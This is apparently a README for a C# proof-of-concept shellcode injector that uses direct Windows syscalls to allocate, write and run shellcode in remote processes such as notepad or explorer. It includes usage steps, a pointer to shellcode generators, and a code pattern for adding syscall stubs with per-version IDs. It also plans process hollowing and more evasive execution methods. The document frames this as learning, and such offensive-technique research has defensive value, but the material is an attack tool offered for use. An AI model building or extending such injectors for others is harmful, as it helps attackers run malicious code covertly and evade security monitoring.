# directInjectorPOC

Small program written in C#, compatible with .NET >= v3.5 . Only x64. Works from ws 2008 up to the latest windows 10 update. 

Created as a way to learn more about direct syscalls and their implementation in C#. 

The program uses direct syscalls to perform the shellcode allocation/injection and the remote thread creation. The only imports are GetSystemInfo, RtlGetVersion and VirtualProtectEx.

The shellcode can be easily generated using tools like donut (https://github.com/TheWover/donut/)

### Usage: 

Shellcode alloc/injec methods: 
- ALLOCWRITE: Uses NtAllocateVirtualMemory and ZwWriteVirtualMemory to allocate and write the shellcode in the remote process
- OPENSEC: Uses NtCreateSection to create a new section and NtMapViewOfSection to map it to the local and remote process.

By default the program injects into "notepad" using the ALLOCWRITE write method. This can be easily modified by changing line 18 
```
Inject("notepad", osV, ALLOCWRITE);
```
can be changed to 
```
Inject("explorer", osV, OPENSEC);
```
to inject the shellcode into explorer.exe using the OPENSEC method. 

The shellcode must be in base64 and assigned to the "s" variable on line 91

```

### Dev:

Take a look at syscalls.cs. To create a new syscall:
- Add the syscall ID to each windows version inside the sysDic dictionary.  
- Create its function delegate inside the Delegates struct
- Create a function thar runs GetDelegateForFunctionPointer and invokes the delegate functions (you can just copy paste any of the current ones and change them a little bit to adjust your needs) 
- If needed, create the required structs inside nativeStructs.cs

For example, if we would like to implement NtClose we can do the following:
```
...
            { "win10-1507", new Dictionary<string, byte>()
                {
                    { "openprocess",0x26},
                    { "allocatevirtualmem", 0x18},
                    { "writevirtualmem", 0x3A},
                    { "createremthread", 0xB3},
                    { "createsection", 0x4A },
                    { "mapviewofsec", 0x28 },
                    { "close", 0x0F }
                }
            },
...
```
```
public struct Delegates{
...
            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int NtClose(IntPtr handler);
...
```
```
        public static NTSTATUS NtClose(IntPtr handle, string os)
        {
            byte[] syscall = syscallSkeleton;
            syscall[4] = sysDic[os]["close"];

            unsafe
            {
                fixed (byte* ptr = syscall)
                {

                    IntPtr memoryAddress = (IntPtr)ptr;

                    if (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress,
                        (UIntPtr)syscall.Length, 0x40, out uint oldprotect))
                    {
                        throw new Win32Exception();
                    }

                    Delegates.NtClose myAssemblyFunction = (Delegates.NtClose)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtClose));

                    return (NTSTATUS)myAssemblyFunction(handle);
                }
            }
        }
```

##### ToDo:

  - Implement more ways to write our shellcode in a remote process (process hollowing, dll hollowing, etc)
  - New execution methods (steal them from pinjectra :) )
  - Try to avoid the use of VirtualProtectEx when allocating our shellcode
  - Try catch everything just in case
